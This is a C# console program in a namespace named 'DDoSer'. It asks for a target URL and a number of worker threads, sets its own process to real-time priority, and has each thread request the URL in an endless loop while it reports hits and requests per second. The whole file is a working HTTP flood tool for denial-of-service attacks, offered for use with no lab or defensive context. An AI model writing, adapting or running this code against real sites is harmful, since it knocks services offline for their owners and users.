using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace DDoSer
{
    public class Program
    {
        private static int count = 0;
        private static int countElapsed = 0;
        private static int speed = 0;
        private static readonly int timerInterval = 1000;

        private static void Main()
        {
            System.Timers.Timer timer = new()
            {
                Interval = timerInterval
            };
            timer.Elapsed += OnTimedEvent;
            timer.AutoReset = true;

            Console.Write("URL name of TARGET (Example https://www.google.com/): ");
            string url = Console.ReadLine();

            Console.Write("Workers count: ");
            int numOfThreads = Convert.ToInt32(Console.ReadLine());

            using (Process p = Process.GetCurrentProcess())
            {
                p.PriorityClass = ProcessPriorityClass.RealTime;
            }

            Thread[] threads = new Thread[numOfThreads];

            Parallel.For(0, numOfThreads, (i) =>
            {
                threads[i] =
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                            ++count;
                            Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec");
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                        }
                    }
                });
            });

            timer.Enabled = true;

            Parallel.ForEach(threads, (i) =>
            {
                i.Start();
            });
        }

        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            speed = count - countElapsed;
            countElapsed = count;
        }
    }
}
